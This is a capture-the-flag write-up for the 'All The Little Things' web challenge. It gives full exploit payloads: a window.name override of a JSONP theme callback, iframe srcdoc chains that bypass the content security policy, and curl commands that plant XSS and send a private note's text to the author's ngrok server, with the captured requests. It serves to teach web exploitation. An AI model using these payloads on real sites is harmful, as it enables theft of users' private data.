# All The Little Things

The description is as follows:

```
I left a little secret in a note, but it's private, private is safe.

Note: TJMike🎤 from Pasteurize is also logged into the page.

https://littlethings.web.ctfcompetition.com
```

Read my pasteurization write-up before this one, as this write-up relies on the injection used in pasteurization.

## Enumeration

The site is similar to pasteurize, but has a login system, and a list of notes are stored.  There's also a `/settings` page where you can modify your name,
profile picture link, and theme.  The site has a content security policy:

```
content-security-policy: default-src 'none';script-src 'self' 'nonce-b00149201d92096b';img-src https: http:;connect-src 'self';style-src 'self';base-uri 'none';form-action 'self';font-src https://fonts.googleapis.com
```

### Settings

At the bottom of the page is a comment `<!-- ?__debug__ -->`.  When we add it to the page's URL, an extra Debug textarea shows up, and an additional
debug.js source file is loaded.  The update button sets `window.name` to the value in the textarea.

### Page Init

Various scripts are included in every page, and do some initialization on page load.

#### utils.js

`utils.js` has an event handler for `DOMContentLoaded` that makes a request to `/me`, which is a route that returns some JSON information about the user:

```
{"username":"zoey","img":"https://7713b3ef1338.ngrok.io/cloud.jpg","theme":{"cb":"set_dark_theme","options":{},"choice":2}}
```

#### user.js

That parsed JSON is then passed to `make_user_object` which creates a new `User` class object that has private values and no setters for properties on it.

```js
class User {
    #username; #theme; #img
    constructor(username, img, theme) {
        this.#username = username
        this.#theme = theme
        this.#img = img
    }
    get username() {
        return this.#username
    }

    get img() {
        return this.#img
    }

    get theme() {
        return this.#theme
    }

    toString() {
        return `user_${this.#username}`
    }
}

function make_user_object(obj) {

    const user = new User(obj.username, obj.img, obj.theme);
    window.load_debug?.(user);

    // make sure to not override anything
    if (!is_undefined(document[user.toString()])) {
        return false;
    }
    document.getElementById('profile-picture').src=user.img;
    window.USERNAME = user.toString();
    document[window.USERNAME] = user;
    update_theme();
}
```

#### debug.js

This file is included by the server if `__debug__` is defined in the query string. `make_user_object` calls `load_debug` defined in `debug.js`, which calls `JSON.parse` on `window.name` and then uses the resulting
value to extend the user object.

```js
// Extend user object
function load_debug(user) {
    let debug;
    try {
        debug = JSON.parse(window.name);
    } catch (e) {
        return;
    }

    if (debug instanceof Object) {
        Object.assign(user, debug);
    }

    if(user.verbose){
        console.log(user);
    }

    if(user.showAll){
        document.querySelectorAll('*').forEach(e=>e.classList.add('display-block'));
    }

    if(user.keepDebug){
        document.querySelectorAll('a').forEach(e=>e.href=append_debug(e.href));
    }else{
        document.querySelectorAll('a').forEach(e=>e.href=remove_debug(e.href));
    }

    window.onerror = e =>alert(e);
}
```

#### theme.js

After the debug script, the theme is loaded via `update_theme` and a request to the `/theme?cb=set_dark_theme` route is made, which is a JSONP-like endpoint.  The
code:

```js
function set_dark_theme(obj) {
    const theme_url = "/static/styles/bootstrap_dark.css";
    document.querySelector('#bootstrap-link').href = theme_url;
    localStorage['theme'] = theme_url;
}

//...

function update_theme() {
    const theme = document[USERNAME].theme;
    const s = document.createElement('script');
    s.src = `/theme?cb=${theme.cb}`;
    document.head.appendChild(s);
}
```

### /theme

A request to `/theme?cb=set_dark_theme` returns the following

```js
set_dark_theme({"version":"b1.13.7","timestamp":1598252951983})
```

Doing some testing, it seems that the route supports the following regex for the callback name: `[A-Za-z0-9_.]`.  This should allow us to call a single function,
and then set at least one value to another.  This seems like a good place to start.  Lets try and override this callback value.

## Overriding the theme callback

Trying to modify the `POST /settings` route request values didn't yield any results, but the debug script allows us to extend the user object.  After some experimentation, we
learn that if the first part of the `window.name` JSON is a value for `__proto__`, then lack of a setter on the `User` class no longer prevents us from adding our own theme object.
To test, open up `/settings?__debug__` and set `window.name` via the form or in the console.  Then refresh the page to start the initialization sequence.  The
following payload allows us to override the callback:

```json
{
   "__proto__": {},
   "theme": {
      "cb": "alert"
   }
}
```

If everything went properly, you should get an alert with `[object Object]`.

## Abusing the callback

We now have the ability to set one value to another.  We can control things like `window.name`, `location.hash`, and `location.search`, and if we append
`toString` we can successfully assign an almost arbitrary string to what we want, since `toString` will just ignore the theme object.  This should
allow us to set arbitrary HTML with the following payload:

```json
{
   "__proto__": {},
   "theme": {
      "cb": "document.body.innerHTML=window.name.toString"
   },
   "htmlGoesHere": "<h1>Hi!</h1>"
}
```

Setting `window.name` to the above should result in removing most of the page content and replacing it with the payload, so we now have arbitrary HTML injection.
Unfortunately, due to the content security policy, we can't do the traditional `<img src=x onerror=alert()>` or use a `<script>` tag, because those aren't
executed when inserted via `innerHTML`.

## Multiple callbacks

After a *long* chain of trial and error, we came to a solution that allowed us to chain multiple callbacks.  An `<iframe>` with a `srcdoc` attribute
allowed us to bypass the `innerHTML` `<script>` tag restriction, because you can access the parent DOM via `window.top`:

```json
{
   "__proto__":{},
   "theme":{
      "cb":"document.body.innerHTML=window.name.toString"
   },
   "htmlGoesHere": "<iframe srcdoc='<script src=/theme?cb=window.top.document.body.innerHTML=window.top.location.search.toString></script>'>"
}
```

The above payload should result in the contents of the page being changed to just `?__debug__` if run on the `/settings?__debug__` route.

## Exfiltration

We considered trying to setup our own script tag since we could retrieve and set the nonce, but decided to go with an idea that allowed us to concatenate the
text on the page, with the url of a server we owned, and then make a request to it.

### Concatenation

We realized we could concatenate two values via `innerText` with HTML similar to the following:

```html
<form id='concat'>
   https://url.of.our.server/?
   <div>value_to_concat</div>
</form>
```

Then `window.concat.innerText` would be `https://url.of.our.server/?value_to_concat`.

### Putting it all together

Now all that was left was to craft the payload, test it and send it to the admin.  We crafted a payload that would send us the full `innerText` of the `/note` page:

```json
{
   "__proto__":{},
   "theme":{
      "cb":"document.body.firstElementChild.innerHTML=window.name.toString"
   },
   "payload":[
      "<form id='concat'>https://0b7660a35154.ngrok.io/?<div></div></form>",
      "<iframe srcdoc='<script src=/theme?cb=window.top.concat.firstElementChild.innerText=window.top.document.body.innerText.toString></script>'></iframe>",
      "<iframe srcdoc='<script src=/theme?cb=window.top.location.href=window.top.concat.innerText.toString></script>'></iframe>"
   ]
}
```

In order, this payload should overwrite the contents of the `<nav>` element on the page with our arbitrary HTML containing the two additional callback
executions.  The first grabs the `innerText` of the whole page, and places it in our concatenation `<div>`.  The second callback retrieves the
`innerText` of the `concat` form which should be our URL plus the text of the page, and then sets the browser location to make the request.  We
should then be able to grab the contents of the page by looking at the request sent to our local http server.  Testing it on our own browser, we find that it works.
It sometimes fails due to the script loading order, but succeeds most of the time.

### Getting the note id

Lets incorporate our payload into the exploit for the previous pasteurization challenge.  We'll need to set `window.name` and then change the `location.href`
value to the page we want the text of.  If you remember, certain characters are escaped, so lets base64 encode the JSON string.  Don't forget to url encode as well.

```sh
curl 'https://pasteurize.web.ctfcompetition.com/' --data-raw 'content[]=;window.name=atob(`eyJfX3Byb3RvX18iOiB7fSwidGhlbWUiOiB7ImNiIjogImRvY3VtZW50LmJvZHkuZmlyc3RFbGVtZW50Q2hpbGQuaW5uZXJIVE1MPXdpbmRvdy5uYW1lLnRvU3RyaW5nIn0sImltZyI6ICIvIiwicGF5bG9hZCI6IFsiPGZvcm0gaWQ9J2NvbmNhdCc%2BaHR0cHM6Ly8wYjc2NjBhMzUxNTQubmdyb2suaW8vPzxkaXY%2BPC9kaXY%2BPC9mb3JtPiIsIjxpZnJhbWUgc3JjZG9jPSc8c2NyaXB0IHNyYz0vdGhlbWU%2FY2I9d2luZG93LnRvcC5jb25jYXQuZmlyc3RFbGVtZW50Q2hpbGQuaW5uZXJUZXh0PXdpbmRvdy50b3AuZG9jdW1lbnQuYm9keS5pbm5lclRleHQudG9TdHJpbmc%2BPC9zY3JpcHQ%2BJz48L2lmcmFtZT4iLCI8aWZyYW1lIHNyY2RvYz0nPHNjcmlwdCBzcmM9L3RoZW1lP2NiPXdpbmRvdy50b3AubG9jYXRpb24uaHJlZj13aW5kb3cudG9wLmNvbmNhdC5pbm5lclRleHQudG9TdHJpbmc%2BPC9zY3JpcHQ%2BJz48L2lmcmFtZT4iXX0%3D`);debugger;if(!window.skipIt)location.href=`https://littlethings.web.ctfcompetition.com/note?__debug__`;//'
```

The `debugger` and `window.skipIt` were added so we could just interact with recaptcha in the browser, and could prevent our own browser from running the payload and have time to click the report link.  So now all thats left is to visit the page of our public note created with the above command, make sure to have devtools open, run `window.skipIt = true` when the debugger pauses, and then unpause the debugger, and click `share with TJMike`.  Of course you'll also need a server
to receive the exfiltrated data.  We end up with the following request on our server:

```http
21:45:13: GET /?{%22__proto__%22:%20{},%22theme%22:%20{%22cb%22:%20%22document.body.firstElementChild.innerHTML=window.name.toString%22},%22img%22:%20%22/%22,%22payload%22:%20[%22https://0b7660a35154.ngrok.io/?%22,%22%22,%22%22]}Your%20notes22f23db6-a432-408b-a3e9-40fe258d500fCreate%20new%20noteNote:%20Visibility:privatepublic
```

So `22f23db6-a432-408b-a3e9-40fe258d500f` is the private note guid.

### Get the contents of the private note

Now all we should have to do is change the url in our payload, and we should get the contents of the private note.

```sh
╭─zoey@virtual-parrot ~ 
╰─$ curl 'https://pasteurize.web.ctfcompetition.com/' --data-raw 'content[]=;window.name=atob(`eyJfX3Byb3RvX18iOiB7fSwidGhlbWUiOiB7ImNiIjogImRvY3VtZW50LmJvZHkuZmlyc3RFbGVtZW50Q2hpbGQuaW5uZXJIVE1MPXdpbmRvdy5uYW1lLnRvU3RyaW5nIn0sImltZyI6ICIvIiwicGF5bG9hZCI6IFsiPGZvcm0gaWQ9J2NvbmNhdCc%2BaHR0cHM6Ly8wYjc2NjBhMzUxNTQubmdyb2suaW8vPzxkaXY%2BPC9kaXY%2BPC9mb3JtPiIsIjxpZnJhbWUgc3JjZG9jPSc8c2NyaXB0IHNyYz0vdGhlbWU%2FY2I9d2luZG93LnRvcC5jb25jYXQuZmlyc3RFbGVtZW50Q2hpbGQuaW5uZXJUZXh0PXdpbmRvdy50b3AuZG9jdW1lbnQuYm9keS5pbm5lclRleHQudG9TdHJpbmc%2BPC9zY3JpcHQ%2BJz48L2lmcmFtZT4iLCI8aWZyYW1lIHNyY2RvYz0nPHNjcmlwdCBzcmM9L3RoZW1lP2NiPXdpbmRvdy50b3AubG9jYXRpb24uaHJlZj13aW5kb3cudG9wLmNvbmNhdC5pbm5lclRleHQudG9TdHJpbmc%2BPC9zY3JpcHQ%2BJz48L2lmcmFtZT4iXX0%3D`);debugger;if(!window.skipIt)location.href=`https://littlethings.web.ctfcompetition.com/note/22f23db6-a432-408b-a3e9-40fe258d500f?__debug__`;//'
Found. Redirecting to /8d52d02b-e4ff-4939-8a42-096d1d46e295
```

Now lets visit the note we created at `https://pasteurize.web.ctfcompetition.com/8d52d02b-e4ff-4939-8a42-096d1d46e295` and repeat the process above with the debugger and dev tools to send our payload to TJMike.  It might take a few tries for the timings of the callbacks to line up properly.  If done right, your http server should get a request similar to the following

```http
22:12:41: GET /?{%22__proto__%22:%20{},%22theme%22:%20{%22cb%22:%20%22document.body.firstElementChild.innerHTML=window.name.toString%22},%22img%22:%20%22/%22,%22payload%22:%20[%22https://0b7660a35154.ngrok.io/?%22,%22%22,%22%22]}22f23db6-a432-408b-a3e9-40fe258d500fCongratulations!%20You%20came%20to%20the%20end%20of%20the%20world...As%20for%20a%20reward,%20here%20comes%20your%20juicy%20flag%20CTF{When_the_w0rld_c0mes_t0_an_end_all_that_matters_are_these_little_things}Bored?%20Check%20out%20the%20fixed%20version%20https://fixedthings-vwatzbndzbawnsfs.web.ctfcompetition.com%20BUT%20IT%27S%20NOT%20SCORED!%20I.E.%20worth%200%20points%20and%20does%20not%20appear%20in%20challengesback
        Host: 0b7660a35154.ngrok.io
        Pragma: no-cache
        Cache-Control: no-cache
        Upgrade-Insecure-Requests: 1
        User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/85.0.4182.0 Safari/537.36
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
        Sec-Fetch-Site: cross-site
        Sec-Fetch-Mode: navigate
        Sec-Fetch-User: ?1
        Sec-Fetch-Dest: document
        Referer: https://littlethings.web.ctfcompetition.com/note/22f23db6-a432-408b-a3e9-40fe258d500f?__debug__
        Accept-Encoding: gzip, deflate, br
        X-Forwarded-Proto: https
        X-Forwarded-For: 104.155.55.51
```

When we decode it and clean it up we get:

```
Congratulations! You came to the end of the world...As for a reward, here comes your juicy flag CTF{When_the_w0rld_c0mes_t0_an_end_all_that_matters_are_these_little_things}

Bored? Check out the fixed version https://fixedthings-vwatzbndzbawnsfs.web.ctfcompetition.com BUT IT'S NOT SCORED! I.E. worth 0 points and does not appear in challenges
```